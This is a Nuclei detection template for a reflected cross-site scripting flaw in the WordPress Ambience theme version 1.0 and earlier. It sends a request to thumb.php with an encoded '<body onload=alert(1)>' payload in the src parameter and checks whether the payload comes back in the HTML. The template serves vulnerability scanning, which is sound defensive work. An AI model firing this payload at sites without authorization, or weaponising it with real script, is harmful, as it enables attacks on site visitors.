flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    type: word
    words:
    - /wp-content/themes/ambience/
  method: GET
  path:
  - '{{BaseURL}}'
- matchers:
  - part: body
    type: word
    words:
    - <body onload=alert(1)>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg'
id: wp-ambience-xss
info:
  author: daffainfo
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-80
  description: 'WordPress Ambience Theme 1.0 and earlier was affected by a cross-site
    scripting vulnerability.

    '
  metadata:
    max-request: 2
  name: WordPress Ambience Theme <=1.0 - Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/expl oits/38568
  - https://wpscan.com/vulnerability/c465e5c1-fe43-40e9-894a-97b8ac462381
  severity: medium
  tags: wp-plugin,wp,edb,wpscan,wordpress,xss,vuln
